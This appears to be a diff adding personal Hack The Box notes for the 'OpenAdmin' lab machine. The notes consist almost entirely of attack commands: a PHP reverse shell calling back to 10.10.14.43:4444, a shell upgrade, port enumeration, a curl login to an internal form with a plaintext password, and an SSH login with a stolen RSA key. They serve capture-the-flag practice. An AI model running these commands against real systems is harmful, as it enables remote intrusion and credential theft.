@@ -1,0 +1,15 @@
+php -r '$sock=fsockopen("10.10.14.43", 4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+netstat -pnltu
+
+cd /var/www/internals
+[Notes: if i can log in to the this form it will return me joannas rsa key]
+
+[Somewhat faulty but on write track]
+curl --data-urlencode "login=TRUE&username=jimmy&password=n1nj4W4rri0R!" -X POST 127.0.0.1:52846/index.php
+curl 127.0.0.1:52846/main.php
+
+
+ssh joanna@10.10.10.171 -i /root/go/src/github.com/Raftos18/hack-the-box/machines/OpenAdmin/id_rsa
